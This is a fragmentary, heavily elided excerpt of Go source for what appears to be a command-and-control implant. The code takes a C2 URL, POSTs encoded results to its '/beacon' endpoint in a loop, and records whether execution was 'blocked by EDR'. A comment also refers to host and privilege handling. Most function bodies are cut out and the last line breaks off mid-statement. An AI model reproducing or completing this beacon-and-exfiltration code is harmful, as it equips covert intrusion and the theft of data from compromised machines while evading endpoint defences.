...
// Enable verbose output by starting the agent with CG_DEBUG=1
...
type ExecutionResult struct {
	...
	Status   int    `json:"status"` // 0 = executed, 1 = blocked by EDR
	PID      int    `json:"pid"`
}
...
func sendBeacon(server string, data map[string]interface{}) (*BeaconResponse, error) {
	...
	resp, err := http.Post(server+"/beacon", "text/plain", bytes.NewBuffer([]byte(encoded)))
	if err != nil {
		return nil, err
	}
...
func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage:", os.Args[0], "<C2 URL>")
		os.Exit(1)
	}

	server := os.Args[1]

	    // ----------------- dynamic host & privilege -----------------
	...
	for {
		...
		if len(results) > 0 {
			...
			if _, err := http.Post(server+"/beacon", "text/plain", bytes.NewBuffer([]byte(encoded))); err != nil {
